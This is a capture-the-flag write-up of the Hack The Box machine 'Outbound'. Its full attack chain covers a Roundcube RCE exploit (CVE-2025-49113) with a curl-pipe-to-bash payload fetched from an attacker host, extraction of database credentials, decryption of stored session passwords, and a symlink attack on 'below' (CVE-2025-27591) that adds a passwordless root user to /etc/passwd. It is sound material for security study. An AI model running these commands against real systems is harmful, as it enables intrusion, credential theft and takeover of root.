---
title: "Outbound"
---

![Cap screenshot](Outbound.png)

# Hack The Box - Outbound

Welcome to this writeup for **Outbound**, an easy Linux box from Hack The Box. This machine follows an assume-breach style scenario, so the initial access begins with valid credentials already provided. From there, the path to root comes down to webmail abuse, credential recovery, and a symlink-based privilege escalation.


## Reconnaissance

```text
# Nmap 7.95 scan initiated Tue Jul 15 17:03:39 2025 as: /usr/lib/nmap/nmap -Pn -p- --min-rate 2000 -sC -sV -oN nmap-scan.txt 10.129.147.239
Nmap scan report for 10.129.147.239
Host is up (0.016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 15 17:03:58 2025 -- 1 IP address (1 host up) scanned in 19.28 seconds
```

The target is running Nginx and redirects straight to `mail.outbound.htb`, so I added both the host and second-level domain to my `/etc/hosts` file.

```bash
echo -e 'IP\t\tmail.outbound.htb outbound.htb' | sudo tee -a /etc/hosts
```

## Initial Access

As expected for an assume-breach box, the challenge starts with credentials for an account:

```text
tyler:LhKL1o9Nm3X2
```
![Cap screenshot](Outbound-1.png)

Browsing to `mail.outbound.htb` presents a Roundcube login page. The credentials work, but the mailbox is empty. On the About page, I can see that the installation is running Roundcube **1.6.10**.

![Cap screenshot](Outbound-2.png)

A quick search for issues affecting that version leads to **CVE-2025-49113**, an authenticated remote code execution vulnerability. A public proof of concept is available, so I clone it and use it with the provided credentials and a shell payload.

```bash
$ git clone https://github.com/hakaioffsec/CVE-2025-49113-exploit
$ cd CVE-2025-49113-exploit

$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 'bash -c "curl http://ATTACKER-IP/shell.sh|bash"'
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
```

This lands me in a shell as `www-data` inside a container, which is easy to confirm because `/.dockerenv` is present.

## Privilege Escalation

### Shell as jacob

Inside `/var/www/html/roundcube/config`, I find `config.inc.php` containing the MySQL credentials for Roundcube.

```php
<?php
// --- SNIP ---
$config = [];
 
// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
 
// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';
 
// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';
 
// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';
 
// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';
 
// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';
 
// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';
 
// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
 
// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];
 
// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```

Using those credentials, I log into MySQL and inspect the users and session tables.

```bash
$ mysql -u roundcube -pRCDBPass2025 roundcube

MariaDB [roundcube]> select username from users;
+----------+
| username |
+----------+
| jacob    |
| mel      |
| tyler    |
+----------+
```

The session table is more interesting because it contains base64-encoded PHP serialized data. After decoding it, I spot a `password` field stored in encrypted form.

```text
password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
```

Roundcube stores this using Triple DES, and the first 16 bytes of the decoded data are used as the IV.After searching for a while, we found a Roundcube password decryptor: https://github.com/rafelsusanto/rcube-password-decryptor Using the DES key from the config file. 

Run : 

```python
python3 rcube-decrypt.py
```
Output : 
```text
Paste base64 encrypted password (from session): L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
Paste 24-byte des_key (from config.inc.php): rcmail-!24ByteDESkey*Str
IV: 2fb46fd3403c4eec
Ciphertext: 0902bebb9084f1c5c4a09c8936e409bf
Unpadded (hex): 3539356d4f38446d77476544
Decrypted password (utf-8): 595mO8DmwGeD
Printable ASCII: 595mO8DmwGeD
```
With that password, I log into Roundcube as `jacob` and check the emails. One message from Tyler mentions an important update and contains another password:

![Cap screenshot](Outbound-3.png)

```text
gY4Wr3a1evp4
```

That password works over SSH for `jacob`, giving me access to the host and the user flag.

## Root

A quick `sudo -l` shows that Jacob can run specific commands with `/usr/bin/below`:

```bash
$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

Searching for issues in that binary leads to **CVE-2025-27591**: https://github.com/rvizx/CVE-2025-27591, which is a symlink attack affecting writable log paths under `/var/log/below`. The permissions on the system confirm that the directory is wide open.

```bash
$ ls -la /var/log/below
total 16
drwxrwxrwx  3 root  root   4096 Nov  3 15:57 .
drwxrwxr-x 13 root  syslog 4096 Nov  3 14:30 ..
-rw-rw-rw-  1 jacob jacob   236 Jul  8 20:45 error_jacob.log
-rw-rw-rw-  1 root  root      0 Nov  3 15:57 error_root.log
drwxr-xr-x  2 root  root   4096 Nov  3 14:29 store
```

The idea is to create a symlink to a sensitive file, trigger an error so the file becomes writable, and then replace its contents. I first prepare a copy of `/etc/passwd` and append a root-equivalent user for `deadbeef`.

```bash
$ cp /etc/passwd /tmp/passwd
$ echo 'deadbeef::0:0:root:/root:/bin/bash' >> /tmp/passwd
```

Next, I point `error_root.log` at `/etc/passwd` and trigger the error condition by using an invalid timestamp.

```bash
$ ln -fs /etc/passwd /var/log/below/error_root.log

$ sudo /usr/bin/below replay -t invalid
Nov 03 16:08:33.835 ERRO
----------------- Detected unclean exit ---------------------
Error Message: Unrecognized timestamp format
Input: invalid.
Examples:
 Keywords: now, today, yesterday
 Relative: "{humantime} ago", e.g. 2 days 3 hr 15m 10sec ago
 Relative short: Mixed {time_digit}{time_unit_char}. E.g. 10m, 3d2H, 5h30s, 10m5h
 Absolute: "Jan 01 23:59", "01/01/1970 11:59PM", "1970-01-01 23:59:59"
 Unix Epoch: 1589808367
-------------------------------------------------------------
```

Once the target file becomes writable, I overwrite it with my modified copy and switch to the new root user.

```bash
$ cat /tmp/passwd > /var/log/below/error_root.log

$ su deadbeef
root@outbound:/home/jacob# whoami
root
```

That completes the box.

## (Attack chain)

1. **Find the target**  — Nmap shows SSH and HTTP, and the web server redirects to mail.outbound.htb.
2. **Log in to webmail**  — The provided tyler credentials give access to Roundcube.
3. **Exploit Roundcube**  — Use CVE-2025-49113 to gain a shell as www-data.
4. **Find local creds** — The Roundcube config file contains MySQL credentials.
5. **Inspect session data** — The database session table stores encrypted password data.
6. **Recover Jacob’s password**  — Decrypt the session entry using the Roundcube DES key.
7. **Login as Jacob**  — Use the recovered password over SSH.
8. **Check privilege escalation**  — Jacob is allowed to run /usr/bin/below with restrictions.
9. **Abuse below** — A symlink issue in /var/log/below lets you overwrite /etc/passwd.
10. **Become root** — Add a root-equivalent user and switch to it.
